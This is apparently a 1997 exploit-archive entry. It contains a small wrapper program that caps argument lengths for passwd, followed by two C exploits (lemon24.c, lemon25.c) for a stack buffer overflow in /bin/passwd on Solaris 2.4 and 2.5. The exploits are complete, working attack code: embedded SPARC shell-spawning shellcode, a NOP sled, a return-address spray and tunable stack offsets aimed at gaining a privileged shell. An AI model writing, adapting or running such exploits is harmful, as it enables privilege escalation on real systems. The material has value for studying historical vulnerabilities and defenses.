---------------------------- file newpass.c -------------------------------
#include <stdio.h>
#include <syslog.h>

#define hidden_passwd "/bin/hpasswd" /*change here ...*/
#define MAX_LENGTH 32

void main(int argc, char *argv[])
{
int i;
char *args[10];

        if(argc < 10)
        {
                args[0]=hidden_passwd;
                for(i = 1; i<argc; i++)
                {
                        if(strlen(argv[i]) > MAX_LENGTH)
                        {
                                printf("You reached the maximum length in
args\n");
                                exit(0);
                        }
                        else args[i]=argv[i];
                }
                args[i]=(char *)0;
                execv(args[0],args);
        }
        else
        {
                printf("You reached the maximum number of args !\n");
        }
}

---------------------------- end newpass.c -----------------------------------



------------------------------ EXPLOITS ----------------------------------



------------------------------ lemon24.c --------------------------------
/*
Exploit for Solaris 2.4 ( it is a little and subtile different  beetwen
this
exploit and the prog for Solaris 2.5 - the overflow buffer is shifted
with 1 char )
With argv[1] you can modify the stack_offset (+-256).
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BUF_LENGTH      600
#define EXTRA           600
#define STACK_OFFSET    1400
#define SPARC_NOP       0xa61cc013

u_char sparc_shellcode[] =
"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
"\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"
"\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
"\x91\xd0\x20\x08"
;

u_long get_sp(void)
{
  __asm__("mov %sp,%i0 \n");
}

void main(int argc, char *argv[])
{
  char buf[BUF_LENGTH + EXTRA + 8];
  long targ_addr;
  u_long *long_p;
  u_char *char_p;
  int i, code_length = strlen(sparc_shellcode),dso=0;

  if(argc > 1) dso=atoi(argv[1]);

  long_p =(u_long *)  buf ;
    targ_addr = get_sp() - STACK_OFFSET - dso;

  for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
    *long_p++ = SPARC_NOP;

  char_p = (u_char *) long_p;

  for (i = 0; i < code_length; i++)
    *char_p++ = sparc_shellcode[i];

  long_p = (u_long *) char_p;


  for (i = 0; i < EXTRA / sizeof(u_long); i++)
    *long_p++ =targ_addr;

  printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
  targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
  execl("/bin/passwd", "passwd", & buf[1],(char *) 0);
  perror("execl failed");
}

-------------------------------- end of lemon24.c ----------------------------

---------------------------------- lemon25.c --------------------------------

/*
This is for Solaris 2.5.(1) !
With argv[1] you can modify the stack offset (+-500) if you have troubles
...
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BUF_LENGTH      1100
#define EXTRA           1200
#define STACK_OFFSET    3800
#define SPARC_NOP       0xa61cc013

u_char sparc_shellcode[] =
"\x82\x10\x20\xca\xa6\x1c\xc0\x13\x90\x0c\xc0\x13\x92\x0c\xc0\x13"
"\xa6\x04\xe0\x01\x91\xd4\xff\xff\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
"\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a"
"\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd4\xff\xff"
;

u_long get_sp(void)
{
  __asm__("mov %sp,%i0 \n");
}

void main(int argc, char *argv[])
{
  char buf[BUF_LENGTH + EXTRA];
  long targ_addr;
  u_long *long_p;
  u_char *char_p;
  int i, code_length = strlen(sparc_shellcode),dso=0;

  if(argc > 1) dso=atoi(argv[1]);

  long_p =(u_long *)  buf;
    targ_addr = get_sp() - STACK_OFFSET - dso;

  for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
    *long_p++ = SPARC_NOP;

  char_p = (u_char *) long_p;

  for (i = 0; i < code_length; i++)
    *char_p++ = sparc_shellcode[i];

  long_p = (u_long *) char_p;


  for (i = 0; i < EXTRA / sizeof(u_long); i++)
    *long_p++ =targ_addr;

  printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
  targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
  execl("/bin/passwd", "passwd", buf,(char *) 0);
  perror("execl failed");
}

----------------------------------- end of lemon25.c -----------------------------------

// milw0rm.com [1997-07-12]